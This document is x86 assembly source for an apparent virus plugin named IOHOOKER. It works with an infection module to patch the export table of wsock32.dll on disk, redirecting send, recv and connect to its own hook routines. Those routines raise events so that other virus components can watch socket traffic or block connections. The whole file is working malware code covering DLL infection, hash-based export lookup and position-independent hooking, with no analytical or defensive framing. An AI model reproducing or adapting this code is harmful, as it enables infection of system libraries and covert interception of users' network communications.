   ; IOHOOKER
   ; ~~~~~~~~
   ; - when infecting WSOCK32-alike DLLs (via INFMAN1),
   ;   dispatch send/recv/... addresses
   ; - generate events on send/recv

   include                 INCLUDE\consts.inc
   include                 INCLUDE\mz.inc
   include                 INCLUDE\pe.inc
   include                 infect1.inc
   include                 k32man.inc
   include                 unprot.inc

   include                 plugin.inc
                           PLUGIN_START    IOHOOKER, CODE32, NON_PERMUTABLE

   handleevent:            hookevent   EV_INFECT1_HOOK, main
                           stc
                           retn

   ; ***************************************************************************
   ; we will work with file in physical form, so,
   ; because of PE sections' physical addresses can differ from virtual ones,
   ; this subroutine must use special get_proc_address
   ; ***************************************************************************

   ; task: 1. find export's ptrs to send/recv/?
   ;       2. find this (iohooker) plugin (at EDI)
   ;       3. swap ptrs
   ;       4. patch hook subroutines & do other shit

   ; input: EBX=file ptr in memory (base)
   ;        ESI=virus-in-file RVA

   main:                   pusha

                           mov     ecx, [ebx].mz_neptr
                           mov     ecx, [ecx+ebx].pe_exporttablerva
                           jecxz   __exit
                           push    ecx
                           call    virt2phys
                           pop     ecx
                           push    [ebx+ecx].ex_namerva
                           call    virt2phys
                           pop     ecx
                           add     ecx, ebx        ; ECX=DLL_Name

                           mov     eax, [ecx]
                           or      eax, 20202020h
                           neg     eax
                           cmp     eax, -'cosw'    ; wsock32.dll
                           jne     __exit

                           event   EV_UNPROT_ME

                           call    find_me_there
                           ; EDX=IOHOOKER-there-RVA, ECX=someshit

                           push    edx
                           call    virt2phys
                           pop     eax

                           add     ecx, (pop_addr-plugin_start) - (size plugin_struc)
                           mov     [ebx + eax + patch_ebp-plugin_start], ecx

                           mov_h   edi, send
                           lea     esi, [edx + my_send-plugin_start]
                           call    hook1

                           mov_h   edi, recv
                           lea     esi, [edx + my_recv-plugin_start]
                           call    hook1

                           mov_h   edi, connect
                           lea     esi, [edx + my_connect-plugin_start]
                           call    hook1

   __exit:                 popa
                           stc     ; keep event
                           retn

   hook1:                  pusha

                           call    get_proc_address
                           or      eax, eax
                           jz      __exit

                           mov     ecx, [eax]
                           sub     ecx, esi

                           mov     [eax], esi              ; dispatch rva

                           push    esi
                           call    virt2phys
                           pop     esi
                           mov     [ebx+esi-4], ecx        ; E9-jmp to real

   __exit:                 popa
                           retn

   ;----------------------------------------------------------------------------

   ; input:  EDI=name csum
   ; output: EAX=@[function RVA]-phys
   ;         EAX==0 -- not found

   get_proc_address:       pusha

                           mov     ecx, [ebx].mz_neptr
                           mov     ecx, [ecx+ebx].pe_exporttablerva
                           jecxz   __return_0
                           push    ecx
                           call    virt2phys
                           pop     ecx
                           add     ecx, ebx

                           xor     esi, esi        ; current index

   __search_cycle:         lea     edx, [esi*4+ebx]
                           push    [ecx].ex_namepointersrva
                           call    virt2phys
                           pop     eax
                           mov     edx, [edx+eax]  ; name va

   ;; bugfix
                           push    edx
                           call    virt2phys
                           pop     edx
   ;;

                           add     edx, ebx        ; +imagebase

                           xor     eax, eax        ; calculate hash
   __calc_hash:            rol     eax, 7
                           xor     al, [edx]
                           inc     edx
                           cmp     byte ptr [edx], 0
                           jne     __calc_hash

                           cmp     eax, edi        ; compare hashs
                           je      __name_found

                           inc     esi             ; index++
                           cmp     esi, [ecx].ex_numofnamepointers
                           jb      __search_cycle

   __return_0:             xor     eax, eax        ; return 0
                           jmp     __return

   __name_found:           push    [ecx].ex_ordinaltablerva
                           call    virt2phys
                           pop     edx
                           add     edx, ebx        ; +base
                           movzx   edx, word ptr [edx+esi*2]; edx=current ordinal
   ;                       sub     edx, [ecx].ex_ordinalbase  ; -ordinal base
                           push    [ecx].ex_addresstablerva
                           call    virt2phys
                           pop     eax
                           add     eax, ebx        ; +base
                           lea     eax, [eax+edx*4]; eax=@[address]

   __return:               mov     [esp].popa_eax, eax  ; popa.eax

                           popa
                           retn

   virt2phys:              pusha

                           mov     edi, [ebx].mz_neptr
                           add     edi, ebx

                           movzx   edx, [edi].pe_ntheadersize
                           lea     edx, [edi+edx+18h]

                           movzx   ecx, [edi].pe_numofobjects ; ecx = objcount

   __v2p_cycle:            mov     eax, [esp+32+4]

                           sub     eax, [edx].oe_virt_rva
                           jc      __v2p_cont
                           cmp     eax, [edx].oe_phys_size
                           jae     __v2p_cont
                           add     eax, [edx].oe_phys_offs

                           mov     [esp+32+4], eax

                           popa
                           retn

   __v2p_cont:             add     edx, size oe_struc

                           dec     ecx
                           jnz     __v2p_cycle

                           mov     [esp+32+4], ecx

                           popa
                           retn

   find_me_there:          push    esi
                           call    virt2phys
                           pop     edx
                           xor     ecx, ecx

   __cycle:                cmp     [ebx+edx].plugin_id, EV_IOHOOKER_BASE
                           je      __found
                           add     ecx, [ebx+edx].plugin_size
                           add     edx, [ebx+edx].plugin_size
                           cmp     dword ptr [ebx+edx], 0
                           jne     __cycle
                           jmp     $

   __found:                lea     edx, [esi+ecx]

                           retn

   ;----------------------------------------------------------------------------

   my_send_real:           db      0E9h
                           dd      ?

   my_send:                pushf
                           pusha
                           lea     edx, [esp+32+4+4]         ; stack frame ptr
                           call    get_ebp
                           event   EV_IOHOOKER_ON_SEND
                           popa
                           popf

                           jmp     my_send_real

   my_recv_real:           db      0E9h
                           dd      ?

   my_recv:                push    dword ptr [esp].dword ptr 16    ; arg4
                           push    dword ptr [esp+4].dword ptr 12  ; arg3
                           push    dword ptr [esp+8].dword ptr 8   ; arg2
                           push    dword ptr [esp+12].dword ptr 4  ; arg1
                           call    my_recv_real

                           pushf
                           pusha
                           mov     ecx, eax; ecx=# of bytes received
                           or      eax, eax; 0 bytes received
                           jz      __skip
                           inc     eax     ; -1=error
                           jz      __skip
                           lea     edx, [esp+32+4+4]      ; stack frame ptr
                           call    get_ebp
                           event   EV_IOHOOKER_ON_RECV
   __skip:                 popa
                           popf

                           retn    4*4

   my_connect_real:        db      0E9h
                           dd      ?

   my_connect:             pushf
                           pusha
                           lea     edx, [esp+32+4+4]         ; stack frame ptr
                           call    get_ebp
                           event   EV_IOHOOKER_ON_CONNECT
                           ; event handled == deny connect()
                           jnc     fuckup_connect
                           popa
                           popf
                           jmp     my_connect_real

   fuckup_connect:         popa
                           popf
                           mov     eax, -1         ; ERROR
                           retn    3*4

   get_ebp:                call    $+5
   pop_addr:               pop     ebp
                           sub     ebp, 12345678h
   patch_ebp               equ     dword ptr $-4
                           retn

   ;----------------------------------------------------------------------------

                           PLUGIN_END
